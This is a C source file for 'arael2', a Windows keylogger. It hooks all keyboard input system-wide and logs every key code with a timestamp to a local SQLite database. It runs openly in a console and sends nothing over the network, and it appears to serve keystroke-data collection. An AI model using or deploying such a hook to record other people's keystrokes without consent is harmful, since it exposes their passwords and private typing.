/*  arael2 – windows keylogger
 *
 *  build (msvc) :
 *      cl /O2 /std:c11 /EHsc keylog.c sqlite3.c user32.lib kernel32.lib
 *
 *  build (mingw) :
 *      gcc -O2 -std=c11 -luser32 -lkernel32 -lsqlite3 keylog.c -o keylog.exe
 *
 *  usage :
 *      run keylog.exe               (admin rights not strictly required
 *                                    for WH_KEYBOARD_LL, but some setups
 *                                    may need them)
 *
 *  behaviour
 *  ---------
 *  • db file is  $ARAEL2_ROOT\keydb\keys.db
 *    (falls back to current working directory when ARAEL2_ROOT is unset)
 *  • on start-up we print:
 *        – arael2 root
 *        – resolved db dir and file
 *        – confirmation that the keyboard hook is active
 *  • every key-down event is:
 *        – inserted into the sqlite db (ts_us, code, os="windows")
 *        – echoed to stdout
 */

 #define _CRT_SECURE_NO_WARNINGS
 #define WIN32_LEAN_AND_MEAN
 #define _POSIX_C_SOURCE 199309L    /* for sqlite */
 
 #include <windows.h>
 #include <sqlite3.h>
 
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <sys/stat.h>              /* for _mkdir on msvc */
 
 #define KEYDB_SUBDIR "\\keydb"
 #define KEYDB_FILE   "\\keys.db"
 #define MAX_PATH_LEN 4096
 
 /* ------------------------------------------------------------------ */
 /* globals                                                            */
 /* ------------------------------------------------------------------ */
 static HHOOK        g_hook  = NULL;
 static sqlite3     *g_db    = NULL;
 static sqlite3_stmt*g_stmt  = NULL;
 static volatile int g_quit  = 0;
 
 /* ------------------------------------------------------------------ */
 /* helpers                                                            */
 /* ------------------------------------------------------------------ */
 static void fatal(const char *msg)
 {
     fprintf(stderr, "%s : %lu\n", msg, GetLastError());
     ExitProcess(1);
 }
 
 static int64_t filetime_to_us(const FILETIME *ft)
 {
     /* 100-ns units since 1601-01-01 -> µs */
     uint64_t t = ((uint64_t)ft->dwHighDateTime << 32) | ft->dwLowDateTime;
     return (int64_t)(t / 10);
 }
 
 static void ensure_dir(const char *dir)
 {
 #ifdef _MSC_VER
     if (_mkdir(dir) == -1 && errno != EEXIST && GetLastError() != ERROR_ALREADY_EXISTS)
         fatal("mkdir keydb");
 #else
     if (mkdir(dir, 0700) == -1 && errno != EEXIST)
         fatal("mkdir keydb");
 #endif
 }
 
 /* ------------------------------------------------------------------ */
 /* low-level keyboard hook                                            */
 /* ------------------------------------------------------------------ */
 static LRESULT CALLBACK ll_keyboard_proc(int nCode, WPARAM wParam, LPARAM lParam)
 {
     if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
         KBDLLHOOKSTRUCT *ks = (KBDLLHOOKSTRUCT *)lParam;
         DWORD vk  = ks->vkCode;
 
         FILETIME ft;
 #if _WIN32_WINNT >= 0x0601
         GetSystemTimePreciseAsFileTime(&ft);
 #else
         GetSystemTimeAsFileTime(&ft);
 #endif
         int64_t ts_us = filetime_to_us(&ft);
 
         sqlite3_bind_int64(g_stmt, 1, ts_us);
         sqlite3_bind_int   (g_stmt, 2, (int)vk);
         sqlite3_bind_text  (g_stmt, 3, "windows", -1, SQLITE_STATIC);
 
         if (sqlite3_step(g_stmt) != SQLITE_DONE)
             fprintf(stderr, "sqlite step error: %s\n", sqlite3_errmsg(g_db));
 
         sqlite3_reset(g_stmt);
 
         printf("captured vk %lu at %lld us\n", (unsigned long)vk, (long long)ts_us);
         fflush(stdout);
     }
     return CallNextHookEx(g_hook, nCode, wParam, lParam);
 }
 
 /* ------------------------------------------------------------------ */
 /* ctrl-c handler – sets quit flag                                    */
 /* ------------------------------------------------------------------ */
 static BOOL WINAPI console_ctrl_handler(DWORD type)
 {
     if (type == CTRL_C_EVENT || type == CTRL_BREAK_EVENT ||
         type == CTRL_CLOSE_EVENT || type == CTRL_SHUTDOWN_EVENT) {
         g_quit = 1;
         return TRUE;
     }
     return FALSE;
 }
 
 /* ------------------------------------------------------------------ */
 /* main                                                               */
 /* ------------------------------------------------------------------ */
 int main(void)
 {
     /* resolve paths */
     char root[MAX_PATH_LEN] = {0};
     char db_dir [MAX_PATH_LEN] = {0};
     char db_path[MAX_PATH_LEN] = {0};
 
     const char *env = getenv("ARAEL2_ROOT");
     if (env && *env)
         strncpy(root, env, sizeof root - 1);
     else
         strncpy(root, ".", sizeof root - 1);
 
     if (snprintf(db_dir,  sizeof db_dir,  "%s%s", root, KEYDB_SUBDIR) >= (int)sizeof db_dir)
         fatal("db dir path too long");
 
     if (snprintf(db_path, sizeof db_path, "%s%s", db_dir, KEYDB_FILE) >= (int)sizeof db_path)
         fatal("db file path too long");
 
     /* print resolved values */
     printf("arael2 root        : %s\n", root);
     printf("keystroke db dir   : %s\n", db_dir);
     printf("keystroke db file  : %s\n", db_path);
     fflush(stdout);
 
     ensure_dir(db_dir);
 
     /* sqlite init */
     if (sqlite3_open(db_path, &g_db) != SQLITE_OK)
         fatal("sqlite open");
 
     sqlite3_exec(g_db, "pragma journal_mode=WAL;", 0, 0, 0);
     sqlite3_exec(g_db,
         "create table if not exists keystrokes ("
         " ts_us integer,"
         " code  integer,"
         " os    text);",
         0, 0, 0);
 
     const char *sql = "insert into keystrokes(ts_us, code, os) values (?,?,?);";
     if (sqlite3_prepare_v2(g_db, sql, -1, &g_stmt, 0) != SQLITE_OK)
         fatal("sqlite prepare");
 
     /* install ctrl-c handler */
     SetConsoleCtrlHandler(console_ctrl_handler, TRUE);
 
     /* install low-level keyboard hook */
     g_hook = SetWindowsHookExA(WH_KEYBOARD_LL, ll_keyboard_proc, NULL, 0);
     if (!g_hook)
         fatal("SetWindowsHookEx");
 
     printf("keyboard hook active – listening for keystrokes\n");
     fflush(stdout);
 
     /* message loop until quit */
     MSG msg;
     while (!g_quit && GetMessageA(&msg, NULL, 0, 0) > 0) {
         TranslateMessage(&msg);
         DispatchMessageA(&msg);
     }
 
     /* cleanup */
     UnhookWindowsHookEx(g_hook);
     sqlite3_finalize(g_stmt);
     sqlite3_close(g_db);
 
     fprintf(stderr, "\n[clean exit] keystrokes saved. goodbye.\n");
     return 0;
 }
 